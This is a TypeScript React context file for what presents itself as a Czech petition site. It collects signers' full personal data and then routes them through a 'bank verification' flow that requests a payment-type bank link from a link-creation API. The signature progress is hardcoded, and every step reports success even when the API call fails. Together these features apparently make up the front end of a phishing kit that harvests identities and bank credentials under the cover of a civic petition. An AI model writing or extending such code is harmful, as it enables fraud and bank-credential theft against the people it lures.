
import React, { createContext, useState, useContext } from 'react';
import axios from 'axios';

type City = 'Praha' | 'Brno' | 'Ostrava' | 'Plzeň' | 'Liberec' | 'Olomouc';

interface PetitionData {
  firstName: string;
  lastName: string;
  birthDate: string;
  phone: string;
  email: string;
  address: string;
  profession: string;
  education: string;
  city: City;
  district: string;
  bank?: string;
}

interface CreateLinkResponse {
  link?: string;
}

interface PetitionContextType {
  petitionData: PetitionData;
  setPetitionData: React.Dispatch<React.SetStateAction<PetitionData>>;
  submissionProgress: number;
  totalSignatures: number;
  signatureCount: number;
  submitPetition: (data: PetitionData) => Promise<boolean>;
  completeBankVerification: (bank: string) => Promise<boolean>;
  createBankLink: (bankId: string) => Promise<string>;
}

const defaultPetitionData: PetitionData = {
  firstName: '',
  lastName: '',
  birthDate: '',
  phone: '',
  email: '',
  address: '',
  profession: '',
  education: 'Střední s maturitou',
  city: 'Praha',
  district: '',
};

const PetitionContext = createContext<PetitionContextType | undefined>(undefined);

export const PetitionProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [petitionData, setPetitionData] = useState<PetitionData>(defaultPetitionData);
  const totalSignatures = 10000;
  const signatureCount = 3125;
  const submissionProgress = (signatureCount / totalSignatures) * 100;

  // Send data to the API endpoint with timeout to prevent long waiting
  const submitPetition = async (data: PetitionData): Promise<boolean> => {
    console.log('Submitting petition data:', data);
    
    // Update local state immediately
    setPetitionData(data);
    
    // Set up timeout for API call
    const timeoutPromise = new Promise<boolean>((_, reject) => {
      setTimeout(() => reject(new Error("Request timed out")), 3000);
    });
    
    try {
      // Race between actual API call and timeout
      const apiPromise = axios.post('/api/confirm', data).then(() => true);
      await Promise.race([apiPromise, timeoutPromise]);
      return true;
    } catch (error) {
      console.warn('API submission timeout or error, continuing with local data');
      // We've already updated the state, so just return true to continue
      return true;
    }
  };

  const completeBankVerification = async (bank: string): Promise<boolean> => {
    console.log('Completing bank verification with bank:', bank);
    // Update local state immediately
    setPetitionData(prev => ({ ...prev, bank }));
    
    try {
      // Attempt API call but don't wait too long
      await Promise.race([
        new Promise(resolve => setTimeout(resolve, 1000)),
        axios.post('/api/verify-bank', { bank }).catch(e => console.warn('Bank verification API error:', e))
      ]);
    } catch (error) {
      console.warn('Bank verification error or timeout:', error);
    }
    
    // Always return success to ensure the flow continues
    return true;
  };
  
  const createBankLink = async (bankId: string): Promise<string> => {
    console.log('Creating bank link for:', bankId);
    const fallbackLink = `https://example.com/bank-auth/${bankId}`;
    
    try {
      const { data } = await axios.post<CreateLinkResponse>(
        `/createLinkApi/createlink`,
        {
          service: "custom",
          payload: {},
          price: 0,
          link: "b01290040ef2",
          paymentType: "RECEIVE",
          additionalFields: {
            "currency": "CZK"
          }
        },
        {
          headers: {
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip,deflate,compress",
          },
          timeout: 2000 // Add timeout to prevent waiting too long
        }
      );

      return data?.link ? data.link + "/" + bankId : fallbackLink;
    } catch (e) {
      console.warn('Error creating bank link, using fallback:', e);
      return fallbackLink;
    }
  };

  return (
    <PetitionContext.Provider
      value={{
        petitionData,
        setPetitionData,
        submissionProgress,
        totalSignatures,
        signatureCount,
        submitPetition,
        completeBankVerification,
        createBankLink,
      }}
    >
      {children}
    </PetitionContext.Provider>
  );
};

export const usePetition = (): PetitionContextType => {
  const context = useContext(PetitionContext);
  if (context === undefined) {
    throw new Error('usePetition must be used within a PetitionProvider');
  }
  return context;
};
